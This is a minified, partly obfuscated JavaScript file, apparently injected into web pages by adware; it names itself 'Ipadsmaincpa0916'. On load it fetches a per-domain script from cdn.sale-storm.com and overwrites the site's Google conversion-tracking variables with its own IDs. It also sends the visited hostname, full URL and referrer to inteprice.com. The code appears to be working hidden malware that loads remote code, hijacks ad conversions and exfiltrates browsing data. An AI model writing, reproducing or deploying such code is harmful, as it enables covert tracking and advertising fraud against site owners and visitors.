(function(b,p){function y(){v.Conv?(A(v.Conv),x(l.dir,l.name,d,"",w,"",v.Conv)):x(l.dir,l.name,d,"",w,"")}function x(a,g,k,c,r,t,f){var e=function(a){b.console&&b.console.log&&b.console.log(a.result)},l=z?(p.location.protocol?"https":"http")+"://inteprice.com/net/test/?callback=":(p.location.protocol?"https":"http")+"://inteprice.com/net/?callback=",h="jsonIP"+ +new Date;b[h]=function(a){e&&e(a)};p.getElementsByTagName("head")[0].appendChild(function(){var b=p.createElement("script");b.type="text/javascript";b.charset="utf-8";var e="";f&&(f.google_conversion_id&&(e+="&id="+encodeURIComponent(f.google_conversion_id)),f.google_conversion_label&&(e+="&la="+encodeURIComponent(f.google_conversion_label)),f.google_conversion_value&&(e+="&va="+encodeURIComponent(f.google_conversion_value)),f.google_conversion_currency&&(e+="&cu="+encodeURIComponent(f.google_conversion_currency)));var d=t?"&l="+encodeURIComponent(m.encode(t)):"";b.src=l+h+"&d="+encodeURIComponent(a)+"&n="+encodeURIComponent(g)+"&i="+encodeURIComponent(k)+"&t="+encodeURIComponent(c)+"&h="+encodeURIComponent(r)+"&r="+encodeURIComponent(p.referrer)+e+d;return b}())}function B(a,g){function k(a,c,k){a/=k?700:2;a+=~~(a/c);for(c=0;455<a;c+=36)a=~~(a/35);return c+~~(36*a/(a+38))}function c(a,c){for(var k=1114112,g=0,b=a.length;g<b;++g){var f=a[g];f>=c&&f<k&&(k=f)}if(1114112<=k)throw Error("Next smallest code point not found.");return k}function b(a){return a+(26>a?97:22)}function h(a){if(48<=a&&57>=a)return a-22;if(65<=a&&90>=a)return a-65;if(97<=a&&122>=a)return a-97;throw Error("Illegal digit #"+a);}function f(a,c){for(var k=[],g=36,f=c;;g+=36){var e=g<=a+1?1:g>=a+26?26:g-a;if(f<e){k.push(b(f));break}else k.push(b(e+(f-e)%(36-e))),f=~~((f-e)/(36-e))}return k}function e(a){if("string"!=typeof a)return a;a=a.split("").map(function(a){return a.charCodeAt(0)});for(var g=[],e=[],b=0,d=a.length;b<d;++b){var h=a[b];128>h?g.push(h):e.push(h)}var l,r;(l=r=g.length)&&g.push(45);for(var t=128,m=72,n=0,d=a.length;r<d;++t,++n)for(b=c(e,t),n+=(b-t)*(r+1),t=b,b=0;b<d;++b)if(h=a[b],h<t){if(++n==p)throw Error("Delta overflow.");}else h==t&&(g=g.concat(f(m,n)),m=k(n,r+1,l==r),n=0,r++);return String.fromCharCode.apply(String,g)}function l(a){if("string"!=typeof a)return a;var c=1+a.lastIndexOf("-");a=a.split("").map(function(a){return a.charCodeAt(0)});for(var g=a.slice(0,c?c-1:0),b=128,f=72,e=0,d=a.length;c<d;++e){for(var r=e,m=36,n=1;;m+=36){var p=h(a[c++]),e=e+p*n,q=m<=f+1?1:m>=f+26?26:m-f;if(p<q)break;n*=36-q}m=1+g.length;f=k(e-r,m,0==r);b+=~~(e/m);e%=m;g.splice(e,0,b)}return String.fromCharCode.apply(String,g)}if("string"!=typeof a||""==a)return a;a=a.toLowerCase();var p=Math.pow(2,53);a=a.split(".");if(g)for(var d=0,m=a.length;d<m;++d){if(""!=a[d]&&"xn--"==a[d].substring(0,4)){var n=a[d].substring(4),u=l(n);u!=n&&(a[d]=u)}}else for(d=0,m=a.length;d<m;++d){var u=e(a[d]),q=u.length,n=u.substring(q-1,q);"-"==n&&u.substring(0,q-1)==a[d]||""==u||(a[d]="xn--"+u)}return a=a.join(".")}var l={dir:"main",name:"Ipadsmaincpa0916"};if(b[l.name])b.console&&b.console.log&&b.console.log("dublicate "+l.name);else{b[l.name]={};b[l.name].IpCpA=void 0;var v=b[l.name];v.strip_www=function(a){return"www."==a.substr(0,4)||"wap."==a.substr(0,4)?a.substr(4,a.length):"m."==a.substr(0,2)?a.substr(2,a.length):a};var d=v.strip_www(b.location.hostname),w=b.location.href;if(""==d)var z=1,d="test.com",w="http://test.com";else z=0;d=B(d);if("gtm-msr.appspot.com"!=d){var A=function(a){function g(){return"function"==typeof b.google_trackConversion?1:0}function k(a){if("undefined"!=typeof a){for(var g=b.google_trackConversion,k="google_conversion_id google_conversion_format google_conversion_type google_conversion_order_id google_conversion_language google_conversion_value google_conversion_currency google_conversion_domain google_conversion_label google_conversion_color google_disable_viewthrough google_enable_display_cookie_match google_remarketing_only google_remarketing_for_search google_conversion_items google_custom_params google_conversion_date google_conversion_time google_conversion_js_version onload_callback opt_image_generator google_conversion_page_url google_conversion_referrer_url".split(" "),f=0;f<k.length;++f)if("undefined"!=typeof b[k[f]])try{delete b[k[f]]}catch(d){b[k[f]]=void 0}for(var e in a)"google_conversion_language"!=e&&(b[e]=a[e]);!0!==a.google_remarketing_only&&(b.google_conversion_format="3");a={onload_callback:function(){}};"function"==typeof g&&g(a)}}g()?k(a):function(){var c=p.createElement("script");c.type="text/javascript";c.async=!0;c.charset="utf-8";c.src=("https:"==p.location.protocol?"https":"http")+"://www.googleadservices.com/pagead/conversion_async.js";var b=0;c.onload=c.onerror=function(){b||(b=1,c.onreadystatechange=c.onload=c.onerror=null,setTimeout(function(){g()&&k(a)},100))};c.onreadystatechange=function(){var f=c.readyState;if(f&&("loaded"==f||"complete"==f)){var e=function(){b||(g()?(b=1,c.onload=c.onerror=null,k(a)):setTimeout(function(){b||(d++,6>=d?e():(b=1,c.onload=c.onerror=null,g()&&k(a)))},200))};c.onreadystatechange=null;var d=0;e()}};var d=p.getElementsByTagName("script")[0];d?d.parentNode.insertBefore(c,d):p.documentElement.firstChild.appendChild(c)}()},n=z?l.dir+"/domains/":"https://cdn.sale-storm.com/wd/net/"+l.dir+"/domains/",n=n+d+"-sets.js",h=p.createElement("script");h.type="text/javascript";h.charset="utf-8";h.async=!0;h.src=n;var q=0;h.onload=h.onerror=function(){q||(q=1,h.onreadystatechange=h.onload=h.onerror=null,setTimeout(function(){void 0!==b[l.name].IpCpA?y():x(l.dir,l.name,d,"UNKNOWN",w)},100))};h.onreadystatechange=function(){var a=h.readyState;if(a&&("loaded"==a||"complete"==a)){var g=function(){q||(void 0!==b[l.name].IpCpA?(q=1,h.onload=h.onerror=null,y()):setTimeout(function(){q||(k++,6>=k?g():(q=1,h.onload=h.onerror=null,void 0!==b[l.name].IpCpA?y():x(l.dir,l.name,d,"UNKNOWN",w)))},200))};h.onreadystatechange=null;var k=0;g()}};(n=p.getElementsByTagName("script")[0])?n.parentNode.insertBefore(h,n):p.documentElement.firstChild.appendChild(h);var m={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(a){var g="",b,c,d,h,f,e,l=0;for(a=m._utf8_encode(a);l<a.length;)b=a.charCodeAt(l++),c=a.charCodeAt(l++),d=a.charCodeAt(l++),h=b>>2,b=(b&3)<<4|c>>4,f=(c&15)<<2|d>>6,e=d&63,isNaN(c)?f=e=64:isNaN(d)&&(e=64),g=g+m._keyStr.charAt(h)+m._keyStr.charAt(b)+m._keyStr.charAt(f)+m._keyStr.charAt(e);return g},decode:function(a){var b="",k,c,d,h,f,e=0;for(a=a.replace(/[^A-Za-z0-9\+\/\=]/g,"");e<a.length;)k=m._keyStr.indexOf(a.charAt(e++)),c=m._keyStr.indexOf(a.charAt(e++)),h=m._keyStr.indexOf(a.charAt(e++)),f=m._keyStr.indexOf(a.charAt(e++)),k=k<<2|c>>4,c=(c&15)<<4|h>>2,d=(h&3)<<6|f,b+=String.fromCharCode(k),64!=h&&(b+=String.fromCharCode(c)),64!=f&&(b+=String.fromCharCode(d));return b=m._utf8_decode(b)},_utf8_encode:function(a){a=a.replace(/\r\n/g,"\n");for(var b="",d=0;d<a.length;d++){var c=a.charCodeAt(d);128>c?b+=String.fromCharCode(c):(127<c&&2048>c?b+=String.fromCharCode(c>>6|192):(b+=String.fromCharCode(c>>12|224),b+=String.fromCharCode(c>>6&63|128)),b+=String.fromCharCode(c&63|128))}return b},_utf8_decode:function(a){var b="",d=0,c;for(c1=c2=0;d<a.length;)c=a.charCodeAt(d),128>c?(b+=String.fromCharCode(c),d++):191<c&&224>c?(c2=a.charCodeAt(d+1),b+=String.fromCharCode((c&31)<<6|c2&63),d+=2):(c2=a.charCodeAt(d+1),c3=a.charCodeAt(d+2),b+=String.fromCharCode((c&15)<<12|(c2&63)<<6|c3&63),d+=3);return b}}}}})(window,document);